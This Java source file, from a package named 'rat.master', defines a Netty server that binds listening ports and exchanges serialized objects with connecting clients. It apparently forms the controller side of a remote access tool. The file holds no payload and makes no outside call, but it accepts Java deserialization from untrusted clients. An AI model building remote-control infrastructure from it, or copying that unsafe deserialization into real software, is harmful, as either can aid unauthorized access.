package rat.master;

import org.jboss.netty.bootstrap.ServerBootstrap;
import org.jboss.netty.channel.Channel;
import org.jboss.netty.channel.ChannelPipeline;
import org.jboss.netty.channel.ChannelPipelineFactory;
import org.jboss.netty.channel.Channels;
import org.jboss.netty.channel.socket.nio.NioServerSocketChannelFactory;
import org.jboss.netty.handler.codec.serialization.ClassResolvers;
import org.jboss.netty.handler.codec.serialization.ObjectDecoder;
import org.jboss.netty.handler.codec.serialization.ObjectEncoder;

import java.net.InetSocketAddress;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executors;

public class Server {

    private MasterConnectionHandler masterConnectionHandler = new MasterConnectionHandler(this);

    private ServerBootstrap bootstrap;

    private Map<Integer, Channel> serverChannels = new HashMap<>();

    public Server() {
        initBootstrap();
    }

    private void initBootstrap() {

        // Configure server.
        bootstrap = new ServerBootstrap(
                new NioServerSocketChannelFactory(
                        Executors.newCachedThreadPool(),
                        Executors.newCachedThreadPool()));

        // Set up the pipeline factory.
        bootstrap.setPipelineFactory(new ChannelPipelineFactory() {
            public ChannelPipeline getPipeline() {

                ChannelPipeline p = Channels.pipeline(
                        new ObjectEncoder(),
                        new ObjectDecoder(ClassResolvers.cacheDisabled(getClass().getClassLoader())),
                        masterConnectionHandler);

                return p;
            }
        });

    }

    public void bindPort(int port) {
        if (port < 0 || port > 65535) return;
        if (!serverChannels.containsKey(port)) {
            Channel channel = bootstrap.bind(new InetSocketAddress(port));
            serverChannels.put(port, channel);
        }
    }

    public void unbindPort(int port) {
        if (serverChannels.containsKey(port)) {
            Channel channel = serverChannels.get(port);
            serverChannels.remove(port);
            channel.close();
            MasterConnectionHandler.disconnectClients(port);
        }
    }

    public MasterConnectionHandler getMasterConnectionHandler() {
        return masterConnectionHandler;
    }

}
